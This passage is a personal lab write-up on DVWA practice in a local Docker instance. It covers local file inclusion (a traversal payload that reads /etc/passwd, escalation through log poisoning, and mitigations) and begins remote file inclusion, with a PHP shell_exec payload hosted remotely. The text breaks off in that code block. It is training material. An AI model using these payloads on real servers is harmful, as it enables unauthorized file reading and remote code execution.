# 05 — DVWA Hands-on Lessons

> Lab environment: DVWA running in Docker (local). DVWA security level used: Low (for exploitation demonstration).

---

## Summary of practical lessons
This document records my hands-on practice for several web vulnerabilities: LFI, RFI, SQLi, XSS, command injection, and file upload. Each section includes the steps I performed, sample payloads, what to capture as evidence, and defensive takeaways.

---

### A — Local File Inclusion (LFI)
**Goal:** Read local files by abusing an include parameter (e.g., `?page=`).

**Steps I followed**
1. Set DVWA security to *Low*.
2. Open DVWA → Vulnerabilities → File Inclusion.
3. Try basic traversal: `?page=../../../../etc/passwd` (increase `../` depth as needed).
4. If content appears, screenshot the page showing `/etc/passwd` or similar file contents.

**Evidence to capture**
- Screenshot: DVWA File Inclusion page with `/etc/passwd` output visible.

**Notes & escalation**
- LFI becomes RCE via log poisoning or including session/temp files that contain PHP code.
- Mitigation: whitelist include values; do not use user-supplied paths directly in `include()` or `require()`.

---

### B — Remote File Inclusion (RFI)
**Goal:** Make the server include and execute a remote PHP file you host.

**Core requirements**
- The server's PHP must have `allow_url_include = On` (check via `phpinfo()`).
- You must be able to host a reachable HTTP file (e.g., `http://<host>:8000/rfi.php`).

**Steps I performed**
1. Create payload on host (example file `rfi.php`):
   ```php
   <?php echo shell_exec("whoami"); ?>




